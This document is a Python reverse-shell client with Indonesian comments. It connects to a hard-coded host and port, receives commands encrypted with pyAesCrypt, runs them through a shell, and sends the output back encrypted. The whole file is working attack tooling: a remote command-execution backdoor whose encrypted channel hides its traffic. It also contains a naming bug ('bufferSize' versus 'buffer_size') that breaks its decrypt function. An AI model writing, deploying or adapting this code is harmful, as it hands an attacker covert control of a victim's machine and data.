import subprocess,socket,os
import pyAesCrypt
import io

# Enter IP and Port here
HOST = '192.168.1.5' #IP pribadi pemilik server
PORT = 4420 #PORT server

# Konfigurasi koneksi socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Set buffer size dan password
buffer_size = 1024
password = 'test1'

# Encrypt data
def encryptData(msg):
	edata = str.encode(msg)
	a = io.BytesIO(edata)
	b = io.BytesIO()
	# Mengenkripsi cipher
	pyAesCrypt.encryptStream(a, b, password, buffer_size)
	# Data yg dikirim (bytes-like)
	sendData = b.getvalue()
	return sendData

# Decrypt data
def decryptData(msg):
	# Men-decrypt data ke binary stream
	a = io.BytesIO()
	b = io.BytesIO()
    
	# Mengubah ke byte
	a = io.BytesIO(msg)
	length = len(a.getvalue())
	a.seek(0)

	# Decrypt stream
	pyAesCrypt.decryptStream(a, b, password, bufferSize, length)
	decrypted = str(b.getvalue().decode())
	return decrypted

#Main 
s.sendall(encryptData('Halo\n'))
s.sendall(encryptData('EOF')) #Setiap encrypt data akan memiliki akhiran EOF sebagai penentu apakah file itu akhir dari file atau tidak

#Loop selama belum ada command quit
while True:
	data = s.recv(1024)
	dec = decryptData(data)
	
	if dec == "quit": # Apabila diinputkan "Quit" maka program akan keluar 
		print('\nQuitting...')
		break
	# Apabila diinputkan "cd" maka directory akan diubah sesuai penginputan
	elif dec[:2] == "cd": 
		try: os.chdir(dec[3:])
		except: pass
	else:
		proc = subprocess.Popen(dec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdoutput = proc.stdout.read() + proc.stderr.read()
		sendmsg = str(stdoutput.decode())
		s.sendall(encryptData(sendmsg))
	s.sendall(encryptData('EOF')) #Looping selama tidak diinputkan "quit" dan mengirim dengan akhiran EOF 

# Akhir Loop
s.close()